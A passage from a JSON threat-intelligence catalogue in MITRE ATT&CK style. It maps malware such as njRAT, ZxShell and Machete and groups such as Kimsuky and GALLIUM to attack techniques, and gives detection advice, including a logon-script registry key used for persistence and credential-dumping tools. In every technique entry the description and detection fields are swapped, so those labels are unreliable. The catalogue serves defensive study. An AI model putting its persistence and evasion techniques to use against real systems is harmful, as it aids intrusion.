                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1014": "Rootkit",
                    "T1008": "Fallback Channels"
                }
            }
        },
        {
            "id": "T1071.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "File Transfer Protocols",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1132.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Non-Standard Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0596",
            "type": "tool",
            "attributes": {
                "name": "ShadowPad",
                "aliases": [
                    "POISONPLUG.SHADOW"
                ],
                "labels": [
                    "malware"
                ],
                "description": "ShadowPad is a modular backdoor that was first identified in a supply chain compromise of the NetSarang software in mid-July 2017. The malware was originally thought to be exclusively used by APT41, but has since been observed to be used by various Chinese threat activity groups.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols",
                    "T1132.002": "Non-Standard Encoding",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1033": "System Owner/User Discovery",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 19
        },
        {
            "id": "S0443",
            "type": "tool",
            "attributes": {
                "name": "MESSAGETAP",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "MESSAGETAP is a data mining malware family deployed by APT41 into telecommunications networks to monitor and save SMS traffic from specific phone numbers, IMSI numbers, or that contain specific keywords.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1560.003": "Archive via Custom Method",
                    "T1070.004": "File Deletion",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1083": "File and Directory Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1040": "Network Sniffing"
                }
            },
            "val": 8
        },
        {
            "id": "S0430",
            "type": "tool",
            "attributes": {
                "name": "Winnti for Linux",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Winnti for Linux is a trojan, seen since at least 2015, designed specifically for targeting Linux systems. Reporting indicates the winnti malware family is shared across a number of actors including Winnti Group. The Windows variant is tracked separately under Winnti for Windows.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1205": "Traffic Signaling",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1027": "Obfuscated Files or Information",
                    "T1014": "Rootkit"
                }
            },
            "val": 8
        },
        {
            "id": "T1562.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Disable or Modify System Firewall",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.",
                "detection": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1021.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "VNC",
                "chain_phase": "lateral-movement",
                "description": "Use of VNC may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with VNC.",
                "detection": "Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user.\n\nVNC is a desktop sharing system that allows users to remotely control another computer’s display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1499",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Endpoint Denial of Service",
                "chain_phase": "impact",
                "description": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.",
                "detection": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see Network Denial of Service.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ]
            }
        },
        {
            "id": "S0412",
            "type": "tool",
            "attributes": {
                "name": "ZxShell",
                "aliases": [
                    "Sensocode"
                ],
                "labels": [
                    "malware"
                ],
                "description": "ZxShell is a remote administration tool and backdoor that can be downloaded from the Internet, particularly from Chinese hacker websites. It has been used since at least 2004.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1134.002": "Create Process with Token",
                    "T1056.004": "Credential API Hooking",
                    "T1056.001": "Keylogging",
                    "T1021.005": "VNC",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1136.001": "Local Account",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1499": "Endpoint Denial of Service",
                    "T1125": "Video Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1046": "Network Service Scanning",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 30
        },
        {
            "id": "T1027.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Compile After Delivery",
                "chain_phase": "defense-evasion",
                "description": "Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.(Citation: TrendMicro WindowsAppMac) Typically these should only be used in specific and limited cases, like for software development.",
                "detection": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1120",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Peripheral Device Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0385",
            "type": "tool",
            "attributes": {
                "name": "njRAT",
                "aliases": [
                    "Njw0rm",
                    "LV",
                    "Bladabindi"
                ],
                "labels": [
                    "malware"
                ],
                "description": "njRAT is a remote access tool (RAT) that was first observed in 2012. It has been used by threat actors in the Middle East.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027.004": "Compile After Delivery",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1571": "Non-Standard Port",
                    "T1568.001": "Fast Flux DNS",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1125": "Video Capture",
                    "T1120": "Peripheral Device Discovery",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1012": "Query Registry",
                    "T1010": "Application Window Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 32
        },
        {
            "id": "S0190",
            "type": "tool",
            "attributes": {
                "name": "BITSAdmin",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "BITSAdmin is a command line tool used to create and manage BITS Jobs.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1570": "Lateral Tool Transfer",
                    "T1197": "BITS Jobs",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 4
        },
        {
            "id": "S0112",
            "type": "tool",
            "attributes": {
                "name": "ROCKBOOT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ROCKBOOT is a Bootkit that has been used by an unidentified, suspected China-based group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1542.003": "Bootkit"
                }
            },
            "val": 1
        },
        {
            "id": "S0095",
            "type": "tool",
            "attributes": {
                "name": "FTP",
                "aliases": [
                    "ftp.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "FTP is a utility commonly available with operating systems to transfer information over the File Transfer Protocol (FTP). Adversaries can use it to transfer other tools onto a system or to exfiltrate data.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 2
        },
        {
            "id": "S0069",
            "type": "tool",
            "attributes": {
                "name": "BLACKCOFFEE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BLACKCOFFEE is malware that has been used by several Chinese groups since at least 2013.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1102.001": "Dead Drop Resolver",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1104": "Multi-Stage Channels",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery"
                }
            },
            "val": 7
        },
        {
            "id": "S0021",
            "type": "tool",
            "attributes": {
                "name": "Derusbi",
                "aliases": [
                    "PHOTO"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Derusbi is malware used by multiple Chinese APT groups.   Both Windows and Linux variants have been observed.",
                "platforms": [
                    "Windows",
                    "Linux"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1571": "Non-Standard Port",
                    "T1059.004": "Unix Shell",
                    "T1056.001": "Keylogging",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1218.010": "Regsvr32",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1095": "Non-Application Layer Protocol",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 20
        },
        {
            "id": "S0006",
            "type": "tool",
            "attributes": {
                "name": "pwdump",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "pwdump is a credential dumper.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1003.002": "Security Account Manager"
                }
            },
            "val": 1
        },
        {
            "id": "G0095",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Machete",
                "aliases": [
                    "APT-C-43",
                    "El Machete"
                ],
                "description": "Machete is a suspected Spanish-speaking cyber espionage group that has been active since at least 2010. It has primarily focused its operations within Latin America, with a particular emphasis on Venezuela, but also in the US, Europe, Russia, and parts of Asia. Machete generally targets high-profile organizations such as government institutions, intelligence services, and military units, as well as telecommunications and power companies.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0409": "Machete"
                },
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1218.007": "Msiexec",
                    "T1053.005": "Scheduled Task",
                    "T1189": "Drive-by Compromise",
                    "T1032": "Standard Cryptographic Protocol"
                }
            }
        },
        {
            "id": "T1052.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration over USB",
                "chain_phase": "exfiltration",
                "description": "Monitor file access on removable media. Detect processes that execute when removable media are mounted.",
                "detection": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0409",
            "type": "tool",
            "attributes": {
                "name": "Machete",
                "aliases": [
                    "Pyark"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Machete is a cyber espionage toolset used by Machete. It is a Python-based backdoor targeting Windows machines that was first observed in 2010.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1074.001": "Local Data Staging",
                    "T1052.001": "Exfiltration over USB",
                    "T1059.006": "Python",
                    "T1564.001": "Hidden Files and Directories",
                    "T1560.003": "Archive via Custom Method",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.002": "Software Packing",
                    "T1552.004": "Private Keys",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1217": "Browser Bookmark Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1120": "Peripheral Device Discovery",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery",
                    "T1008": "Fallback Channels",
                    "T1005": "Data from Local System"
                }
            },
            "val": 41
        },
        {
            "id": "G0094",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "Kimsuky",
                "aliases": [
                    "Thallium",
                    "Black Banshee",
                    "Velvet Chollima"
                ],
                "description": "Kimsuky is a North Korean-based threat group that has been active since at least September 2013. The group initially focused on targeting Korean think tanks and DPRK/nuclear-related targets, expanding recently to the United States, Russia, and Europe. The group was attributed as the actor behind the Korea Hydro & Nuclear Power Co. compromise.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0527": "CSPY Downloader",
                    "S0526": "KGH_SPY",
                    "S0414": "BabyShark",
                    "S0353": "NOKKI",
                    "S0111": "schtasks"
                },
                "techniques": {
                    "T1598.003": "Spearphishing Link",
                    "T1587": "Develop Capabilities",
                    "T1586.002": "Email Accounts",
                    "T1583.001": "Domains",
                    "T1059.007": "JavaScript",
                    "T1071.003": "Mail Protocols",
                    "T1071.002": "File Transfer Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560.003": "Archive via Custom Method",
                    "T1114.003": "Email Forwarding Rule",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1557": "Man-in-the-Middle",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1550.002": "Pass the Hash",
                    "T1546.001": "Change Default File Association",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1543.003": "Windows Service",
                    "T1505.003": "Web Shell",
                    "T1219": "Remote Access Software",
                    "T1176": "Browser Extensions",
                    "T1133": "External Remote Services",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1055": "Process Injection",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1040": "Network Sniffing",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0527",
            "type": "tool",
            "attributes": {
                "name": "CSPY Downloader",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "CSPY Downloader is a tool designed to evade analysis and download additional payloads used by Kimsuky.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1497.001": "System Checks",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1053.005": "Scheduled Task",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1070": "Indicator Removal on Host"
                }
            },
            "val": 12
        },
        {
            "id": "T1037.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Logon Script (Windows)",
                "chain_phase": "persistence",
                "description": "Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\Environment\\UserInitMprLogonScript</code>.\n\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon.",
                "detection": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key.\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0526",
            "type": "tool",
            "attributes": {
                "name": "KGH_SPY",
                "aliases": [
                    "KGH_SPY "
                ],
                "labels": [
                    "malware"
                ],
                "description": "KGH_SPY is a modular suite of tools used by Kimsuky for reconnaissance, information stealing, and backdoor capabilities. KGH_SPY derived its name from PDB paths and internal names found in samples containing \"KGH\".",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1555.004": "Windows Credential Manager",
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1114.001": "Local Email Collection",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1037.001": "Logon Script (Windows)",
                    "T1518": "Software Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 20
        },
        {
            "id": "S0414",
            "type": "tool",
            "attributes": {
                "name": "BabyShark",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BabyShark is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 15
        },
        {
            "id": "S0353",
            "type": "tool",
            "attributes": {
                "name": "NOKKI",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "NOKKI is a modular remote access tool. The earliest observed attack using NOKKI was in January 2018. NOKKI has significant code overlap with the KONNI malware family. There is some evidence potentially linking NOKKI to APT37.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.002": "File Transfer Protocols",
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1056.004": "Credential API Hooking",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 15
        },
        {
            "id": "S0111",
            "type": "tool",
            "attributes": {
                "name": "schtasks",
                "aliases": [
                    "schtasks.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "schtasks is used to schedule execution of programs or scripts on a Windows system to run at a specific date and time.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1053.005": "Scheduled Task"
                }
            },
            "val": 1
        },
        {
            "id": "G0093",
            "type": "group",
            "attributes": {
                "val": 15,
                "name": "GALLIUM",
                "aliases": [
                    "Operation Soft Cell"
                ],
                "description": "GALLIUM is a group that has been active since at least 2012, primarily targeting high-profile telecommunications networks. GALLIUM has been identified in some reporting as likely a Chinese state-sponsored group, based in part on tools used and TTPs commonly associated with Chinese threat actors.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0590": "NBTscan",
                    "S0564": "BlackMould",
                    "S0110": "at",
                    "S0106": "cmd",
                    "S0100": "ipconfig",
                    "S0097": "Ping",
                    "S0075": "Reg",
                    "S0040": "HTRAN",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0020": "China Chopper",
                    "S0013": "PlugX",
                    "S0012": "PoisonIvy",
                    "S0005": "Windows Credential Editor",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1588.002": "Tool",
                    "T1583.004": "Server",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1090.002": "External Proxy",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1570": "Lateral Tool Transfer",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1560.001": "Archive via Utility",
                    "T1003.002": "Security Account Manager",
                    "T1003.001": "LSASS Memory",
                    "T1036.003": "Rename System Utilities",
                    "T1553.002": "Code Signing",
                    "T1027.002": "Software Packing",
                    "T1550.002": "Pass the Hash",
                    "T1136.002": "Domain Account",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1190": "Exploit Public-Facing Application",
                    "T1133": "External Remote Services",
                    "T1105": "Ingress Tool Transfer",
